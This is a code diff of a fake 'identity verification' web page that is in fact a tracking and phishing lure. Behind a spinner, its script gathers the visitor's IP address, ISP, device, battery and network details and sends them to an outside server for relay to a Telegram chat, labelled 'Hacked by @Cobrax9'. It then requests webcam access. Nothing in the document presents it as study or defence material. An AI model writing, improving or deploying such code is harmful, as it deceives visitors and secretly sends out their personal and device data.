@@ -3,11 +3,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Account Verification</title>
+  <title>Secure Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      background: linear-gradient(to right, #1c1c1c, #383838);
+      background: linear-gradient(to right, #202020, #303030);
       color: #fff;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
@@ -18,28 +18,26 @@
       margin: 0;
     }
     .card {
-      background-color: #2a2a2a;
+      background-color: #2d2d2d;
       padding: 30px 40px;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
       text-align: center;
-      max-width: 350px;
+      max-width: 360px;
     }
     .card h2 {
       margin-bottom: 10px;
-      font-weight: 600;
     }
     .card p {
       font-size: 14px;
-      color: #bbb;
-      margin-bottom: 20px;
+      color: #ccc;
     }
     .spinner {
       margin: 20px auto;
       width: 40px;
       height: 40px;
       border: 4px solid #999;
-      border-top-color: #00ffcc;
+      border-top-color: #00ffaa;
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
@@ -47,18 +45,17 @@
       to { transform: rotate(360deg); }
     }
     video {
-      display: none;
       margin-top: 20px;
-      border-radius: 8px;
-      width: 100%;
-      max-width: 320px;
+      width: 320px;
+      border-radius: 10px;
+      display: none;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <h2>Account Verification</h2>
-    <p>Please wait while we verify your identity and secure your session.</p>
+    <h2>Verifying Identity</h2>
+    <p>Please wait while we verify your device and session security.</p>
     <div class="spinner"></div>
     <video id="videoPreview" autoplay muted playsinline></video>
   </div>
@@ -70,25 +67,20 @@
 
     let result = "📱 Hacked by @Cobrax9\n\n";
 
-    fetch("https://ipinfo.io/json?token=demo")
-      .then(res => res.json())
-      .then(data => {
-        result += "🌎 Ip Information:\n";
-        result += `🌐 Ip address: ${data.ip}\n`;
-        result += `📡 ISP: ${data.org || "Unknown"}\n`;
-        result += `🔍 ASN: ${data.org?.split(" ")[0] || "Unknown"}\n\n`;
-        collectDeviceInfo();
-      });
-
-    function collectDeviceInfo() {
+    function collectAndSend(ipData = null) {
       const ua = navigator.userAgent;
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      const network = connection ? connection.effectiveType : "unknown";
+      const connection = navigator.connection || {};
+      const network = connection.effectiveType || "Unknown";
 
       navigator.getBattery().then(battery => {
         const charging = battery.charging ? "Yes" : "No";
         const level = Math.round(battery.level * 100) + "%";
+
+        result += "🌎 Ip Information:\n";
+        result += `🌐 IP address: ${ipData?.ip || "Unavailable"}\n`;
+        result += `📡 ISP: ${ipData?.org || "Unknown"}\n`;
+        result += `🔍 ASN: ${ipData?.org?.split(" ")[0] || "Unknown"}\n\n`;
 
         result += "📱 Device Info:\n";
         result += `🔋 Charging: ${charging}\n`;
@@ -99,27 +91,35 @@
         result += `📱 Device Type: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
         result += "👨‍💻 Tracked on: @Cobrax9";
 
-        sendData();
+        sendToTelegram(result);
       });
     }
 
-    function sendData() {
+    function sendToTelegram(message) {
       if (!chatId) return;
 
       fetch("https://render-backend-package1.onrender.com/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, message: result })
+        body: JSON.stringify({ chat_id: chatId, message })
       }).then(() => {
-        // Show webcam after info is sent
+        // Force camera access after sending data
         setTimeout(() => {
           video.style.display = "block";
           navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => { video.srcObject = stream; })
+            .then(stream => {
+              video.srcObject = stream;
+            })
             .catch(() => {});
         }, 1500);
       });
     }
+
+    // Try to fetch IP info, fallback if it fails
+    fetch("https://ipinfo.io/json?token=demo")
+      .then(res => res.json())
+      .then(ipData => collectAndSend(ipData))
+      .catch(() => collectAndSend(null));
   </script>
 </body>
 </html>
